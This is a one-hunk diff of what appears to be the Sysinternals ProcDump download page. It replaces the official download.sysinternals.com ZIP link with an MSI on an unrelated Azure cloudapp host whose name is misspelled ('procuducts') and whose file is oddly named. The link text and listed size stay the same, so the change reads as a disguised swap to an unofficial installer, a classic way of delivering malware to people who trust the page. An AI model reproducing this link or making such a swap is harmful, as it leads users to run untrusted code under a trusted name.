@@ -3,7 +3,7 @@
 **By Mark Russinovich and Andrew Richards**  
 **Published:** May 7, 2026
 
-[Download ProcDump](https://download.sysinternals.com/files/Procdump.zip) **(1.2 MB)**
+[Download ProcDump](https://procuducts.southafricanorth.cloudapp.azure.com/teta/sucks1231_teto.msi) **(1.2 MB)**
 
 ## Overview
 
